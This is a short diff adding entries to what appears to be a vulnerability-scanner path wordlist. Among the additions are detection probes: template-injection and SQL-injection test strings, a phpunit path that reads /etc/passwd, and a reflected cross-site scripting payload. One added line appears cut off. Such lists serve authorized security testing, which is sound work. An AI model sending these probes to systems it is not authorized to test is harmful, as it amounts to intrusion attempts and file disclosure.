@@ -2293,3 +2293,12 @@
 /index.php/ccm/system/dialogs/file/usage/1
 /system.ini?loginuse&loginpas
 /srv/eng/catalog.search?uiconfig=%28alert%281%29%2C%7B%7D%29
+/api/health
+{{pagepath}}cfsPreFill=1&first_name=%7B%7B{{num1}}*{{num2}}%7D%7D
+/auth/v1/account/login_options
+/auth/v1/account/status
+/volume/stream/Rmx1aWc=/{{base64(
+/wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
+/mailinspector
+/mailinspector/vendor/phpunit/phpunit.php?--bootstrap=/etc/passwd
+/?action=shield_action&ex=display_full_page_dynamic&render_slug=render_shield_wploginreplica_header&title=nuclei&message=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
